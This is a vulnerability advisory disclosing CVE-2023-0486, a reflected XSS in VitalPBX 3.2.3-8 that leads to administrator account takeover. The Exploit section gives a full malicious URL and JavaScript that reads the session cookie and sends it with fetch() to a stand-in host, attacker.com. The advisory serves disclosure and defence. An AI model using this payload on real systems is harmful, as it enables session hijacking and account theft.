---
slug: advisories/smith/
title: VitalPBX 3.2.3-8 - Account Takeover via Reflected XSS
authors: Carlos Bello
writer: cbello
codename: smith
product: VitalPBX 3.2.3-8
date: 2023-02-06 12:00 COT
cveid: CVE-2023-0486
severity: 8.8
description: VitalPBX 3.2.3-8 - Account Takeover via Reflected XSS
keywords: Fluid Attacks, Security, Vulnerabilities, Vital PBX, Account Takeover
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                      |
| --------------------- | -------------------------------------------------------------------- |
| **Name**              | VitalPBX 3.2.3-8 - Account Takeover via Reflected XSS                |
| **Code name**         | [Smith](https://en.wikipedia.org/wiki/Aaron_Smith_(DJ))              |
| **Product**           | VitalPBX                                                             |
| **Affected versions** | 3.2.3-8                                                              |
| **State**             | Public                                                               |
| **Release Date**      | 2023-02-06                                                           |

## Vulnerability

|                       |                                                                                                             |
| --------------------- | ------------------------------------------------------------------------------------------------------------|
| **Kind**              | Reflected cross-site scripting (XSS)                                                                        |
| **Rule**              | [008. Reflected cross-site scripting (XSS)](https://docs.fluidattacks.com/criteria/vulnerabilities/008)     |
| **Remote**            | Yes                                                                                                         |
| **CVSSv3 Vector**     | CVSS:AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H                                                                    |
| **CVSSv3 Base Score** | 8.8                                                                                                         |
| **Exploit available** | No                                                                                                          |
| **CVE ID(s)**         | [CVE-2023-0486](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0486)                               |

## Description

VitalPBX version 3.2.3-8 allows an unauthenticated external attacker to
obtain the instance's administrator account via a malicious link. This
is possible because the application is vulnerable to XSS.

## Vulnerability

This vulnerability occurs because the application is vulnerable to XSS.

### Exploit

To exploit this vulnerability, we just need to send a malicious url like
the following to the administrator.

```txt
http://vulnerable.com/?class=<img+src=1+onerror='sid=document.cookie.split(`;`)[0].split(`=`)[1];fetch(`https://attacker.com/vitalpbx/leak?sid=`%2bsid);'>&method=exportCDR&mode=add&refresh_mode=&cdr_filter_id=&source=&destination=&from=2023-01-25%2000%3A00%3A00&to=2023-01-25%2023%3A59%3A59&cdr-report-dt_length=10&format=pdf
```

The payload, in a more readable format, looks like this.

```js
sid=document.cookie.split(`;`)[0].split(`=`)[1];
fetch(`https://attacker.com/vitalpbx/leak?sid=`+sid);
```

## Evidence of exploitation

![ato-reflected-xss](https://user-images.githubusercontent.com/51862990/214717870-390d3c1e-15bd-4fde-85f7-f0d4a47233ce.gif)

![cookie-leak](https://user-images.githubusercontent.com/51862990/214718603-fa6e0405-e90b-4e30-be5a-1f1b3389e698.png)

## Our security policy

We have reserved the ID CVE-2023-0486 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: VitalPBX 3.2.3-8

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://vitalpbx.com/>

## Timeline

<time-lapse
  discovered="2023-01-24"
  contacted="2022-01-24"
  replied=""
  confirmed=""
  patched=""
  disclosure="2023-02-06">
</time-lapse>
